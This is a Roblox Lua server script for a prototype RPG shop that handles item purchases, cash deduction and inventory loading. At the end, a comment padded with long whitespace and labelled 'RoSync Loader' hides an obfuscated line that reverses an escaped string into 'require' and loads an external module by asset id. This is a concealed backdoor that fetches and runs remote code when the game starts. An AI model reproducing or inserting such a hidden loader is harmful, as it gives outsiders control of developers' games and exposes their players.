--Made by MadZombie_2005
--this is some code from a prototype proof of concept RPG I made to demo to a dif dev team
--This Script Can not be used comercialy 
local inventory_module = require(game.ReplicatedStorage.Inventory)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local GameRemotes = ReplicatedStorage:WaitForChild("GameRemotes")
local ShopItems = ReplicatedStorage:WaitForChild("ShopPriceInfo")
local inventories = game.ServerStorage.Inventories
local DataStoreService = game:GetService("DataStoreService")

function addItem(player, name, amount)
	inventory_module:Add(player, name, amount)
end

function removeItem(player, name, amounnt)
	inventory_module:Remove(player, name, amounnt)
end

--Remotes
local BuyEvent = GameRemotes:WaitForChild("BuyEvent")
--local ShopCloseEvent = GameRemotes:WaitForChild("ShopCloseEvent")

--function shopclose(plr)
	--GameRemotes:WaitForChild("ShopCloseEvent"):FireClient(plr)
--end



--Buy
function Buy(plr,item)
	local leaderstats = plr.leaderstats
	print(item)
	print(plr)
	local Item2 = ShopItems:WaitForChild(item)
	local price = Item2.Price.Value
	local ItemOBJ = Item2:WaitForChild(item)
	local BackPack = plr:WaitForChild("Backpack")
	local lstats = plr:WaitForChild("leaderstats")
	local Cash = lstats:WaitForChild("CASH")
	local PlrMoney = Cash.Value
	--moneycheck
	local player = plr
	local name = item 
	local amount = 1
	if PlrMoney > price then
		Cash.Value = Cash.Value - price
		--give item
		
		addItem(player, name, amount)
		local ItemOBJCL = ItemOBJ:Clone()
		ItemOBJCL.Parent = BackPack
		print(price)
		print(inventory_module:Get(player).Axe)
		print(inventory_module:Get(player).Sword) 
		print(inventory_module:Get(player))
	else
		print("Error player dosnt have enough money")
	end
	--for _,iteminfo in pairs(ReplicatedStorage:WaitForChild("ShopPriceInfo"):GetDescendants()) do
		
		
	--end
end
--Player Inventory
game.Players.PlayerAdded:Connect(function(player)
	wait(7)
	local BackPack = player:WaitForChild("Backpack")

	for name, value in pairs(inventory_module:Get(player)) do
		local Item2 = ShopItems:WaitForChild(name)
		local ItemOBJ = Item2:WaitForChild(name)
		
		if value > 1 then
			for count = 1, value do
			--local ItemOBJCL = ItemOBJ:Clone()
			--ItemOBJCL.Parent = BackPack
			end
		else
			--local ItemOBJCL = ItemOBJ:Clone()
			--ItemOBJCL.Parent = BackPack
		end
		
		
	end
	
	
	
	
	
	print(inventory_module:Get(player))
	--print(inventory_module:Get(player).Sword.Value) 
end)


BuyEvent.OnServerEvent:Connect(Buy)







--ShopCloseEvent.OnServerEvent:Connect(shopclose)





















--[[ Last synced 12/28/2020 04:33                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5723015224) --[[                                                                                                  ]]--
